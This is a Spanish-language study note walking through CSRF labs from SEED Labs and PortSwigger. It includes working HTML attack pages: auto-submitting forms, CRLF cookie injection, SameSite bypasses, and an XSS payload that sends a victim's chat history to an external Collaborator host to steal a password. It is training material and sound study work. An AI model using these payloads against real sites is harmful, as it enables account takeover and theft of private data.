---
aliases: ["CSRF"]
tags:
  - hacking/web
  - hacking/explotacion
  - herramientas/burpsuite
  - hacking/laboratorios
estado: 🟢 Terminado
---

# Cross-Site Request Forgery (CSRF)

El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

> [!info] ¿Cómo funciona un ataque CSRF?
> En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.
> 
> Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.
> 
> El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.

Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado (cuidado, ya que también se pueden realizar acciones con ellos).

> [!tip] Tokens CSRF
> Los tokens CSRF son valores secretos y únicos generados por el servidor e incrustados en los formularios HTML o en las cabeceras de las solicitudes. Cuando el usuario envía una solicitud, el servidor verifica que el token enviado coincide con el token esperado. Si no coinciden, la solicitud es rechazada, previniendo así el ataque CSRF. Es crucial que estos tokens sean únicos por sesión de usuario y que no sean predecibles.

Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:

- **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

## Notas de la Práctica

En esta ocasión vamos a trabajar en una máquina donde nosotros ya tenemos credenciales válidas:
```bash
alice:seedalice
samy:seedsamy
```

Con esto en mente, vamos a entrar con las credenciales de Alice:
![[Pasted image 20250825191351.png]]

Estamos en la cuenta de Alice.

Lo primero que vamos a hacer es tratar de interceptar la petición cuando queremos cambiar el nombre para ver cómo se tramita esta petición:
![[Pasted image 20250825191652.png]]

Vemos que tenemos allí los valores. Y además tenemos `__elgg_token` y `__elgg_ts` (timestamp), cada uno con un identificador.

> [!info] `__elgg_token` y `__elgg_ts`
> En el contexto de Elgg (la plataforma utilizada en este laboratorio), `__elgg_token` es el token CSRF principal, mientras que `__elgg_ts` es un *timestamp* que se utiliza para prevenir ataques de *replay* y asegurar que el token no sea demasiado antiguo. Ambos son componentes de la protección CSRF.

Para comenzar a testear el CSRF, vamos a cambiar a `GET` y en el *repeater* vamos a ver si los campos son realmente necesarios:

![[Pasted image 20250825191942.png]]
Ya la petición está en `GET` y vamos a comenzar quitando los `__elgg_token` y `__elgg_ts` y veamos si sin esto podemos cambiar el nombre:

![[Pasted image 20250825192055.png]]

![[Pasted image 20250825192115.png]]

Vemos un `200 OK`, lo que es buena señal, y además si revisamos la web veríamos que efectivamente se cambió el nombre del usuario:

![[Pasted image 20250825192203.png]]

Esto nos indica que esos dos valores en realidad no sirven para nada y esto ya nos da indicios de un posible CSRF.

Lo que podemos intentar es modificando el valor de identificador y también el nombre para cambiar el nombre a otro usuario. En este caso, tratamos con Samy, donde su `id=59`:

![[Pasted image 20250825192429.png]]

Vemos que sale `200 OK`, pero si leemos un poco podremos observar que nos dice que no tenemos suficientes permisos y no se realizó el cambio.

Ahora, si revisamos, nosotros podemos enviar mensajes privados y en estos mensajes nosotros podemos insertar un mensaje privado de la siguiente manera:

![[Pasted image 20250825192914.png]]

Lo que hacemos es ver si los mensajes interpretan valores HTML.

![[Pasted image 20250825193104.png]]

Vemos que el `marquee` no se interpreta, pero el `h1` sí lo hace, por lo que el objetivo va a ser que, mediante un mensaje, cuando Alice lo abra, logremos cambiar su nombre de perfil de "Stark" a "Beater", por ejemplo. Y esto lo hacemos de la siguiente manera:

![[Pasted image 20250825193356.png]]

Si al enviar lo que va a pasar es que a Alice, al no poder cargar la imagen, le saldrá una imagen rota representativa. Si no lo queremos, podemos hacer lo siguiente:
![[Pasted image 20250825193552.png]]

Ya esto lo podemos probar y ver si es que funcionó:

![[Pasted image 20250825193627.png]]

Vemos que sí se logró cambiar solo por el simple hecho de no tener una seguridad robusta, como si funcionaran los tokens.

De esta forma, nosotros podemos cambiar cualquier cosa, incluida la contraseña, aunque en esta web nos pide la contraseña antigua, por lo que podemos validar si es necesario el campo de contraseña antigua para realizar el cambio:

![[Pasted image 20250825194005.png]]

Como vemos, ya capturamos la información y el proceso es el mismo, por lo que procedemos a cambiar el método de `POST` a `GET` y a eliminar el campo de `current_password` para ver si en verdad es necesario:

![[Pasted image 20250825194217.png]]

Vemos que no, no nos deja, por lo que eso está bien validado.

Pero el concepto es el mismo para cualquier otro objetivo.

## PortSwigger

### Lab: CSRF vulnerability with no defenses

Vamos con el primer lab. El propósito es cambiar el correo de un usuario dentro de la web. En este caso, para esto primero tenemos que saber cómo se está produciendo la petición. Para esto, capturamos el momento en el cual se realiza el cambio:

![[Pasted image 20250911094446.png]]

Podemos ver que la petición se realiza a la web de `/my-account/change-email` enviando el valor de `email` con el cuerpo de la petición.

Bueno, en este punto lo que vamos a hacer es que un usuario que ya se encuentra dentro con sus credenciales, mediante una web vulnerable, envíe por `POST` los valores de un formulario y se autoenvíe de forma automática. El formulario nosotros podemos sacarlo de la misma web:
![[Pasted image 20250911094839.png]]

Lo sacamos, acomodamos y eliminamos elementos innecesarios que no son necesarios como el `button` y `label`, y modificamos el valor de `action` para que se envíe a la URL de forma estática, por decirlo así. Y vamos a agregar también etiquetas JavaScript para el envío automático del formulario de la siguiente manera:

```html
<form class="login-form" name="change-email-form" action="https://0a9b008a03d8ec338143a2b400080084.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="pwned@hacked.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

Tenemos la forma automática de enviar un formulario con JavaScript y es seleccionándolo y enviándolo. Como el laboratorio es de PortSwigger, vamos a ver cómo queda en la parte de exploit:
![[Pasted image 20250911095725.png]]

Si enviamos esto, vemos primero a ver si funciona. Nuestro correo actual es `test@test.com`:
![[Pasted image 20250911095632.png]]
Vemos qué pasa:
![[Pasted image 20250911095748.png]]

Cambió, por lo que en este punto podemos enviar el exploit para completar el lab:
![[Pasted image 20250911095854.png]]

Lab Terminado.

### Lab: CSRF where token validation depends on request method

En este lab vamos a ver cómo vulnerar cuando la validación del token depende del método de la petición.

Vamos a comenzar interceptando la petición cuando se intenta hacer el cambio de correo:
![[Pasted image 20250911101856.png]]
Vemos que en este caso no solo se tramita el valor del correo, sino un `csrf` que es un token de seguridad.

Algo que nosotros tenemos que intentar validar es primero si el campo es necesario. Si lo eliminamos y nos permite continuar, en este caso sí lo es. Otra cosa común que suele suceder es que las peticiones se admiten también por otro método. En este caso, si lo pasamos a `GET`, vemos qué sucede:

![[Pasted image 20250911103151.png]]

Vemos que sí es válido. Recordemos que los códigos de estado `300` suelen asociarse a redirecciones, mas no a errores, por lo que podemos tomarlo como correcto y saldrá correcto al darle a `follow redirection`.
![[Pasted image 20250911103311.png]]

En este punto, algo que podemos validar es otra vez si es necesario el campo de `csrf`:

![[Pasted image 20250911103405.png]]
![[Pasted image 20250911103421.png]]

Se tramitó sin problemas sin necesitar el campo de `csrf`, por lo que con esto en mente, tenemos que crear la web maliciosa de la siguiente manera:
```html
<form class="login-form" name="change-email-form"
  action="https://0a9400f6046b1e2d81ce76d9001100de.web-security-academy.net/my-account/change-email" method="GET">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

Perfecto, la estructura del login es de igual forma sacada de la web y cambiamos el `action` para apuntar exactamente a lo que queremos. Además, cambiamos el método para que se ejecute por `GET`. Con esto, vamos a configurarlo en la página de exploit:

![[Pasted image 20250911104039.png]]

Y esto funciona, por lo que veremos:
![[Pasted image 20250911104108.png]]
Lab Terminado.

### Lab: CSRF where token validation depends on token being present

En este lab solo se realizará la validación cuando tenemos presente un token. Si no lo tiene, la petición pasa:
![[Pasted image 20250911104547.png]]

Vemos, al igual que en el anterior, la petición, pero ahora vamos a volver a intentar ver qué pasa cuando eliminamos el parámetro de `csrf`:
![[Pasted image 20250911104701.png]]
Genial, pues nos deja pasar. Con esto en mente, creemos el código de la web maliciosa:
```html
<form class="login-form" name="change-email-form"
  action="https://0af700c9046c20e798d940e500cd00a2.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="pwned@pwned.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

En el apartado de exploit se vería de la siguiente manera:
![[Pasted image 20250911105039.png]]

Enviamos y ya resolveríamos el laboratorio:
![[Pasted image 20250911105126.png]]

Lab Terminado.

### Lab: CSRF where token is not tied to user session

En este laboratorio ya se está empleando el `CSRF` de un solo uso, lo que ya no permite que atacantes puedan reutilizarlo para enviar otras peticiones malintencionadas.

Ahora, esto tiene que estar bien configurado y que los tokens generados sean asociados a las cuentas que los usan. La razón es sencilla: si logramos generar un `CSRF` y no lo usamos, este queda activo. Ahora, si este no está asociado a la cuenta que lo generó, lo que sucede es que podemos usarlos en otras cuentas, y este es el caso de esta máquina y la razón por la que nos dan dos usuarios. Vamos a obtener un `CSRF` válido de la cuenta de `wiener`:

![[Pasted image 20250911111656.png]]

No permitimos que la petición se envíe. Ahora, vamos a crear el archivo HTML malicioso con este token, que debería funcionar:
```html
<form class="login-form" name="change-email-form"
  action="https://0add00be0470395e81f7de0100c900a0.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="hacked@hacked.com">
  <input required="" type="hidden" name="csrf" value="14GTTcgepngtpvz6R5Xq2o3TjQq24duq">
</form>

<script>
  document.forms[0].submit();
</script>
```

Ya tenemos listo el código con el token y el autoenvío, además del token válido insertado. En el exploit se vería así:
![[Pasted image 20250911112217.png]]
Enviemos; esto debería funcionar:

![[Pasted image 20250911112355.png]]
Lab Terminado.

### Lab: CSRF where token is tied to non-session cookie

Bueno, al igual que en el laboratorio anterior, vamos a tener dos usuarios con los cuales vamos a estar realizando las pruebas. En este caso, vamos a tener uno en Firefox y otro corriendo en el Chromium de Burp Suite:
![[Pasted image 20250911121735.png]]
![[Pasted image 20250911121747.png]]

Bueno, vamos a capturar la petición de igual forma de alguno de los dos al momento de cambiar el correo. Con esto podemos intentar ver cómo se tramita y qué es lo que usa:
Wiener:
![[Pasted image 20250911122008.png]]
Carlos:
![[Pasted image 20250911122142.png]]

Perfecto, vemos cómo se están tramitando las peticiones en dos cuentas y esto ayuda en realidad mucho, ya que vemos cosas como que el `csrf` cambia, pero algo que llama la atención es que en el primero de Wiener yo realicé una búsqueda y luego intenté cambiar el nombre, y al parecer arrastró un campo de `search`. A diferencia de Carlos, donde no realicé búsquedas, podemos ver que efectivamente no se está arrastrando nada.

Revisando y por medio de prueba, determinamos que en este caso el `csrf` no es de un solo uso, por lo que se puede reutilizar múltiples veces para cambiar los emails. No podemos eliminar los campos y tampoco realizar cambio de método; ambos `CSRF` son validados y necesarios. Se usó un `csrf` en el otro usuario y vimos que no es válido. Puede que ya tengan algún tipo de vínculo con la cuenta. Esto si solo cambiamos uno de los dos, pero si usamos el `csrf` y `csrfKey` de Carlos en Wiener, funciona, lo que me llama la atención de que ambos campos tienen algún vínculo al ser verificados:

![[Pasted image 20250911123108.png]]

Analicemos: el `csrf` tramitado en el formulario nosotros lo podemos pasar sin ningún problema y poner uno válido que sea el nuestro mismo, pero el `csrfKey` que se almacena en la Cookie es diferente y también necesitamos cambiarla, pero para esto necesitamos alguna forma de hacerlo.

En este punto tenemos algo fundamental y es cómo se están tramitando las búsquedas. Vamos a capturar una y ver más a detalle cómo se están tramitando:
![[Pasted image 20250911123707.png]]
Vemos algo no usual y es que se usa un campo en la cookie llamado `lastSearchTerm` con el valor que le pasamos en la búsqueda. Además, en la respuesta, en `Set-Cookie`, vemos lo mismo, lo que hace `Set-Cookie` es, por decirlo de alguna manera, establecer esa cookie con su valor para una futura búsqueda. Ahora lo que vamos a verificar es si ese campo es inyectable, donde podamos insertar ciertos comandos:
![[Pasted image 20250911124418.png]]
Perfecto, podemos observar que sí tenemos posibilidad de inyectar datos:
![[Pasted image 20250911124945.png]]
Vemos que sí podemos, pero el hecho de que no tome los colores es algo preocupante, por lo que vamos a intentar modificar de esta manera una petición nueva y luego ver su respuesta:

![[Pasted image 20250911125108.png]]
![[Pasted image 20250911125303.png]]
Perfecto, ahora intentemos ver una nueva solicitud a ver qué nos está arrastrando:
![[Pasted image 20250911125343.png]]
Vemos que no se cambió el valor de `csrfKey`; esto ya me indica que no se está interpretando la inyección.

Algo más que podemos intentar es ver si podemos inyectar otro parámetro del mismo estilo `Set-Cookie`:
![[Pasted image 20250911125628.png]]
Logramos inyectar otro `Set-Cookie`, pero necesitamos obligatoriamente hacer un salto de línea para que se interprete. Nosotros podríamos tratar de hacer es revisar el manual de ASCII y determinar cómo se puede insertar un retorno de carro (`\r`) y una nueva línea (`\n`):
![[Pasted image 20250911125939.png]]

Perfecto, podemos ayudarnos del decodificador de Burp Suite para ver cómo va quedando nuestra cadena de la siguiente manera:
![[Pasted image 20250911130056.png]]
Vemos que está bastante bien, podemos intentar con esto a ver qué logramos:
![[Pasted image 20250911130155.png]]
Es de locos y esto funciona. Ahora podemos ver que los colores dan a entender que sí se está interpretando, así que podemos intentar esto igual que antes y ver si en nuevas peticiones logramos un cambio:
![[Pasted image 20250911130416.png]]
Veamos en una nueva petición:
![[Pasted image 20250911130450.png]]
Lo cambiamos, ya con esto estamos listos. Ahora lo que vamos a intentar es crear una estructura en HTML con la cual primero vamos a cargar una búsqueda en la web para primero cambiar el `csrfKey` y luego de esto enviar el formulario, entonces vamos a aplicar algo de conocimientos para esta ocasión.

Veamos cómo nos queda el código y lo explicamos luego:
```html
<form class="login-form" name="change-email-form"
  action="https://0ae90019046635d9819feded0086004b.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@Hacked">
  <input required="" type="hidden" name="csrf" value="KvvdkmMiwPqmbwg8SdLwOLiWXy4PyYRp">
</form>

<img
  src="https://0ae90019046635d9819feded0086004b.web-security-academy.net/?search=Hola;%20%0d%0aSet-Cookie:%20csrfKey=uz34HoR5Mk1fFn8fEu9IvbgqC7I9de3H;%20SameSite=None"
  onerror="document.forms[0].submit();">
```

Vamos a ver, primero configuramos el formulario con el link y el `csrf` correspondiente. Ahora, el formulario aún no se envía, solo se define. Lo primero que intentará cargarse es la imagen, la cual contiene el link con la petición maliciosa al buscador donde se cambiará el valor de `csrfKey` para que concuerde con el `csrf` del formulario y pueda ejecutarse. También se implementó `SameSite=None`, un parámetro que nos permite enviar cookies entre sitios web. Es muy importante, ya que, al ser nuestro un sitio web malicioso, es necesario que se active en la víctima para que las cookies que enviamos desde nuestra web puedan insertarse. Por último, el error que produciría la etiqueta `img` al no poder cargar una imagen, y lo controlamos para que, al producirse, envíe el formulario.

> [!info] Atributo `SameSite` en Cookies
> El atributo `SameSite` en las cookies es una medida de seguridad que ayuda a mitigar los ataques CSRF. Define cuándo se deben enviar las cookies con las solicitudes de origen cruzado.
> - `Strict`: Las cookies solo se envían en solicitudes de mismo sitio. No se envían en solicitudes de origen cruzado, incluso al hacer clic en un enlace.
> - `Lax`: Las cookies se envían en solicitudes de mismo sitio y en solicitudes de origen cruzado si son navegaciones de nivel superior (como un enlace `<a>` o `GET` de un formulario) y el método HTTP es `GET`. No se envían en solicitudes `POST` de origen cruzado.
> - `None`: Las cookies se envían en todas las solicitudes, tanto de mismo sitio como de origen cruzado, siempre que se use el atributo `Secure`. Requiere `Secure` para funcionar.
> 
> En este laboratorio, la inyección de `SameSite=None` en la cookie `csrfKey` es crucial para que la cookie pueda ser enviada desde el sitio del atacante al sitio vulnerable, permitiendo así el bypass de la protección.

Veamos en el exploit para ver cómo nos queda:
![[Pasted image 20250911134449.png]]
Ahora sí, veamos si funciona:
![[Pasted image 20250911134500.png]]
Lab Terminado.

### CSRF con token duplicado en cookie

Al parecer, tenemos el token duplicado en la cookie, por lo que entiendo, y esto, en sí, no tiene seguridad, pero vamos a ver cómo está hecho para comprenderlo mejor:

![[Pasted image 20250911135402.png]]
Vemos que tenemos el token duplicado y esto seguridad no tiene por ningún lado. Sería transportar el mismo concepto del Lab anterior y modificar los dos campos.
![[Pasted image 20250911135501.png]]
Revisando un poco, vemos que no se verifica que sea un token válido, sino que solo se verifica si los dos son iguales, por lo tanto, esto es muy malo, así que vamos a crear algo similar a lo anterior, viendo si de alguna manera `search` tiene la misma vulnerabilidad.

![[Pasted image 20250911135800.png]]
Vemos que sí es lo mismo y solo vamos a modificar un poco el código, quedando de la siguiente manera:
```html
<form class="login-form" name="change-email-form"
  action="https://0ae6003c04fa057880f7032a009b003a.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
  <input required="" type="hidden" name="csrf" value="hacked">
</form>

<img
  src="https://0ae6003c04fa057880f7032a009b003a.web-security-academy.net/?search=Hola;%20%0d%0aSet-Cookie:%20csrf=hacked;%20SameSite=None"
  onerror="document.forms[0].submit();">
```

Como vemos, es el mismo concepto anterior con el cambio de que podemos poner cualquier cosa en el `csrf` y `csrfKey` siempre y cuando sean iguales. Vemos en exploit:
![[Pasted image 20250911140703.png]]

Vemos si funciona:
![[Pasted image 20250911140724.png]]

Lab Terminado.

### Lab: SameSite Lax bypass via method override

Esta máquina es bastante sencilla. El objetivo, por decirlo de alguna forma, es tramitar una petición por `GET` y forzar a esta misma para que se presente como `POST`. Es algo extraño encontrar esto en las webs, ya que depende mucho de la lógica que se esté implementando por detrás en la web, pero puede ser útil:
![[Pasted image 20250911160958.png]]
Ahora esa petición vamos a pasarla a `GET`:
![[Pasted image 20250911161026.png]]
Así tal cual como vemos no funciona, pero concatenando el parámetro `_method=POST` puede funcionar:
![[Pasted image 20250911161157.png]]

> [!tip] `_method` Parameter Override
> Algunas aplicaciones web permiten anular el método HTTP real de una solicitud (por ejemplo, de `GET` a `POST`) mediante un parámetro de consulta o de cuerpo llamado `_method`. Esto es común en frameworks que buscan simplificar el manejo de rutas RESTful. Si una aplicación valida el método HTTP antes de verificar las cookies `SameSite`, un atacante podría enviar una solicitud `GET` (que permite cookies `SameSite=Lax`) y luego usar `_method=POST` para que la aplicación la procese como `POST`, eludiendo así la protección `SameSite=Lax` para métodos `POST`.

Tomando esto en cuenta, para resolver solo vamos a crear una web que apunte tal y como lo tenemos en el Burp Suite y debería funcionar. El código es el siguiente:
```html
<script>
  location = "https://0a0d00e804c10b71808d0d2900ed00c9.web-security-academy.net/my-account/change-email?email=Hacker%40hack.com&_method=POST";
</script>
```

![[Pasted image 20250911161513.png]]Listo.
![[Pasted image 20250911161529.png]]
Lab Terminado.

### Lab: SameSite Strict bypass via client-side redirect

Al igual que en los otros laboratorios, el objetivo es cambiar el correo electrónico y para esto, como siempre, vamos a capturar cómo se efectúa la petición para este cambio:

![[Pasted image 20250911161939.png]]

Vemos cómo se tramitan las peticiones y es que no tenemos un `csrf`. Intentemos tramitar la petición por `GET` a ver si se puede hacer:
![[Pasted image 20250911162322.png]]
Perfecto, sí podemos hacerlo. En este punto, podemos crear la web maliciosa e intentar solo con un script llamar a la web y ver si se resuelve:

![[Pasted image 20250911162449.png]]
En este punto, vemos si se resuelve el lab:
![[Pasted image 20250911162522.png]]
Pues no, no se resuelve y puede que algo raro esté pasando. Vamos a ver cómo se tramita el exploit para entender:
![[Pasted image 20250911163304.png]]
Primero vemos que en la petición no estamos arrastrando cookies y lo que nos llama la atención es que tiene el `SameSite=Strict`, el cual no permite arrastrar las cookies.

Entonces, lo que tenemos que hacer es que toda la inyección tiene que darse en la misma página, por lo que tenemos que burlar el `SameSite=Strict`. Para esto, vamos a buscar algo que nos permita cargar la web desde su mismo origen.

Revisando la web, me encontré que al realizar una publicación de un post, solito se redirige al mismo sin darle a regresar luego de unos segundos. Revisando el historial, me encontré con la siguiente petición:
![[Pasted image 20250911165422.png]]
Esta es la web para confirmar que se subió y regresar, pero la misma luego de unos segundos realiza otra petición que sería la siguiente:
![[Pasted image 20250911165539.png]]
En este vemos que se llama a un script el cual, por cómo está construido, tenemos el parámetro `postId` que usamos en la petición anterior. Esto nos redirige a `blogPath` que, como nos redirige en la página original a la ruta completa, y `/post/` era `la ruta/post/`, por último, inserta el valor de `postId`. Lo que podemos intentar es ver si el valor puede ser el que queramos:
![[Pasted image 20250911165925.png]]

Y vemos que al redirigirnos hace:
![[Pasted image 20250911165947.png]]
Sí nos redirige; aunque no encuentra el test, nos permite redirigir.

En este punto, lo que podemos hacer es ver si en la parte exacta del `test` le podemos hacer `../my-account` y ver si nos redirige:
![[Pasted image 20250911170228.png]]
![[Pasted image 20250911170241.png]]
Por cómo no nos saca de la cuenta, podemos ver que sí nos arrastra la cookie. Entonces, en este punto lo que podemos hacer es en ese punto, inyectar la URL para el cambio de correo de la siguiente manera:

![[Pasted image 20250911170548.png]]
Está muy bien, pero aún no nos va a funcionar, ya que cosas como el segundo `?` y el `&` nos van a dar problemas, así que vamos a codificar la URL y vemos cómo nos queda:
![[Pasted image 20250911170748.png]]
Vemos si ahora funciona:
![[Pasted image 20250911170818.png]]
Lab Terminado.

### Lab: SameSite Strict bypass via sibling domain

En este laboratorio, al parecer el objetivo es conseguir credenciales válidas. Vamos a ver qué tenemos en la web:

![[Pasted image 20250911173502.png]]
![[Pasted image 20250911173623.png]]
Escribimos en el chat y nos responde lo que parece texto predefinido. En este punto, lo que vamos a hacer es ver cómo se está tramitando el chat:
![[Pasted image 20250911174328.png]]
Vemos que bajo el `/chat` se realiza la petición, pero luego de esta petición lo que tenemos es otro recurso JS que se emite:
![[Pasted image 20250911174815.png]]

Miramos que en esta petición tenemos un `Access-Control-Allow-Origin` el cual carga un dominio diferente. Vamos a revisar qué es eso:
![[Pasted image 20250911175008.png]]

Perfecto, tenemos un dominio aparte el cual cumple con el mismo origen. Es verdad que el subdominio no es el mismo, pero el origen sí, por lo que si logramos de alguna forma desde este realizar un redirect, debería por concepto arrastrarse la cookie.

Bueno, por ahora lo primero que quiero intentar es ver si puedo obtener información del chat. Se están empleando WebSockets, por lo que vamos a revisar el historial de WebSockets a ver cómo se tramita:
![[Pasted image 20250911182109.png]]

Vemos que lo primero que se tramita es un `READY` y luego de esto, comenzamos con los mensajes del chat. Con esto claro, vamos a crear un pequeño script primero para intentar obtener los mensajes del chat, de la siguiente manera:
```html
<script>
  var ws = new WebSocket("/chat");
  ws.onopen = function () {
    ws.send("READY");
  };

  ws.onmessage = function (info) {
    fetch("https://4y36xndfgjd3wp5d7jxd5afnler5fv3k.oastify.com/?data=" + btoa(info.data));
  };
</script>
```

Perfecto, en este script jugamos con WebSockets para generar una conexión y, como vimos que al comenzar, envía un `READY` (parece ser el que inicia el chat). Luego, vamos a guardar lo que nos responda y lo vamos a enviar en Base64 utilizando el Collaborator de Burp Suite. Vemos cómo se ve en el exploit y si esto funciona:
![[Pasted image 20250911194809.png]]

![[Pasted image 20250911195012.png]]

Perfecto, sí nos llegó al Collaborator la cadena en Base64, así que vamos a ver qué es lo que contiene:
![[Pasted image 20250911195211.png]]

Bueno, estamos viendo cómo si abrimos un nuevo chat, esto es debido a que estamos cargando desde un servidor ajeno o tercero, lo que sucede es que por el `SameSite=Strict` no nos arrastra la cookie de sesión.

Entonces, en este punto tenemos que buscar una forma de realizar esto desde el mismo origen para que funcione.

Regresemos a la web de login que encontramos con anterioridad:
![[Pasted image 20250911195711.png]]

Vemos que se refleja lo que escribo. Intentemos inyecciones XSS:
![[Pasted image 20250911195749.png]]
Sí nos interpreta el código. En este punto, vamos a intentar ejecutar nuestro script anterior dentro del `username` a ver qué sucede:
![[Pasted image 20250911195910.png]]
![[Pasted image 20250911200219.png]]
Perfecto, sí nos llegó la información nuevamente de todas las conversaciones. Es posible que ya nos esté arrastrando las conversaciones. Vamos a crear un archivo con toda la información y a intentar pasar de Base64 a normal para ver si es parte de la conversación:

![[Pasted image 20250911200514.png]]

Tenemos el chat, perfecto, sí funciona.

Perfecto, ahora con esto claro, vamos a interceptar la petición para ver cómo se está tramitando:
![[Pasted image 20250911201816.png]]
Vemos que cambiando el método a `GET` también se envía, aunque no funciona del todo, ya que no me llega nada en el Collaborator. En este punto, vamos a intentar desde el navegador a ver qué ocurre:
![[Pasted image 20250911202109.png]]
![[Pasted image 20250911202035.png]]

Perfecto, también está llegando la información. En este punto, podemos armar de esa forma una petición para nuestra página maliciosa, quedando:
```html
<script>
  location = "https://cms-0a33003004623d1c801f039100240050.web-security-academy.net/login?username=%3Cscript%3E+++var+ws+%3D+new+WebSocket(%22https%3A%2F%2F0a33003004623d1c801f039100240050.web-security-academy.net%2Fchat%22)%3B+++ws.onopen+%3D+function+()+{+++++ws.send(%22READY%22)%3B+++}%3B++++ws.onmessage+%3D+function+(info)+{+++++fetch(%22https%3A%2F%2Fx1zz0gg8jcgwzi86ac0683igo7uyis6h.oastify.com%2F%3Fdata%3D%22+%2B+btoa(info.data))%3B+++}%3B+%3C%2Fscript%3E&password=112341234"
</script>
```

![[Pasted image 20250911202234.png]]
Enviemos y veamos si obtenemos algo:
![[Pasted image 20250911202307.png]]
Perfecto, nos acaba de llegar la información. Vamos a copiar todo lo que tengamos a un archivo y ver qué contiene esa conversación:
![[Pasted image 20250911202530.png]]
Listo, al parecer tenemos un usuario `carlos` y una contraseña:
![[Pasted image 20250911202645.png]]
Lab Terminado.

### Lab: SameSite Lax bypass via cookie refresh

En este caso, tenemos la configuración del `SameSite` que pasa a ser `Lax`, la cual nos permite enviar solicitudes desde el mismo sitio y, en las solicitudes de otros sitios, solo mediante el método `GET`.
En este caso, volvemos al cambio de email, el cual es vulnerable. Además, este lab tiene un inicio de sesión basado en `OAuth`, un estándar diseñado para permitir que un sitio web o una aplicación accedan a recursos alojados por otras aplicaciones web. Para entenderlo más fácilmente, es como cuando damos permisos para iniciar sesión mediante Google en otra web.

Bueno, veamos cómo está esto aplicado:

![[Pasted image 20250911213948.png]]

Obtengamos las solicitudes que se realizaron al iniciar sesión:

El flujo del programa es el siguiente: este nos envía para hacer el login y, una vez que lo hacemos, nos redirige a una web que nos pide confirmación y nos manda al `home`. Ahora, en este proceso, lo significativo es cuando se aplica `OAuth`, que es justo el momento después de hacer login. Lo que sucede es que la web nos asigna una cookie temporal con la cual nos manejamos fuera del sistema, pero al iniciar sesión se genera la petición de `OAuth`, la cual permite asignar la nueva cookie de sesión generada:
![[Pasted image 20250911215652.png]]
Como vemos en la imagen, en la respuesta, vemos el `Set-Cookie` y la nueva cookie de la que hacemos uso. Ahora, si revisamos esta cookie, no lleva seguridad, lo que quiere decir que en este punto exacto nosotros comenzamos a arrastrar la cookie. El objetivo es cambiar el email de algún usuario, y el campo del email es completamente vulnerable. Entonces, lo primero que intentamos es un cambio común:
```html
<form class="login-form" name="change-email-form"
  action="https://0a5600af03a720c480fc4415003000b5.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
</form>


<script>
  document.forms[0].submit();
</script>
```

Si usamos esto y lo enviamos, veremos que no funciona. En ese caso, la mentalidad es la siguiente: si no funciona, puede ser que el usuario no esté con la sesión activa, lo que quiere decir que no está con la cookie necesaria para funcionar. ¿Cómo solucionamos esto?
Aquí entra en juego la petición la cual incrusta la nueva cookie, y es que si el usuario ya tenía una sesión iniciada, vamos a encargarnos de primero cargar la web de `OAuth` y esperar un momento (esto para que la cookie sea correcta), y luego de eso, provocamos que cargue el formulario y lo hacemos de la siguiente manera:
```html
<form class="login-form" name="change-email-form"
  action="https://0a7b00860326e8e2800203d5000100f4.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
</form>


<script>
  window.open("https://0a7b00860326e8e2800203d5000100f4.web-security-academy.net/social-login");
  setTimeout(onload, 5000);
  function onload() {
    document.forms[0].submit();
  }
</script>
```

En este caso, lo primero que hacemos es con `window.open` cargar la web, tratando de que se genere la nueva cookie. Luego esperamos 5 segundos y llamamos a la función `onload` que enviará el formulario. Vemos si funciona:
![[Pasted image 20250911221254.png]]

![[Pasted image 20250911221309.png]]
Lab Terminado.

### Lab: CSRF where Referer validation depends on header being present

El objetivo no cambia, es el mismo: cambiar el email de algún usuario.

> [!info] Cabecera `Referer`
> La cabecera `Referer` (con la ortografía incorrecta original) es un campo de cabecera HTTP opcional que identifica la dirección de la página web desde la que se realiza la solicitud. Mediante una verificación de este campo, el servidor del nuevo sitio puede determinar de dónde se originó la solicitud. Es comúnmente utilizada como una medida de seguridad para prevenir CSRF, asegurando que la solicitud provenga de una página legítima dentro del mismo dominio.

Bueno, lo primero que vamos a hacer es ver cómo se tramita la petición para el cambio de email:
![[Pasted image 20250911222054.png]]

No vemos ninguna seguridad robusta de las que hemos tocado, ni nada más allá del Referer. Algo que suele emplearse es que se compara el Referer para ver si la solicitud se está tramitando por el mismo origen. Intentamos recrear el formulario y enviarlo a ver si funciona:
```html
<form class="login-form" name="change-email-form"
  action="https://0ada0062036c757c81c6b13100940028.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="prueba@prueta.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

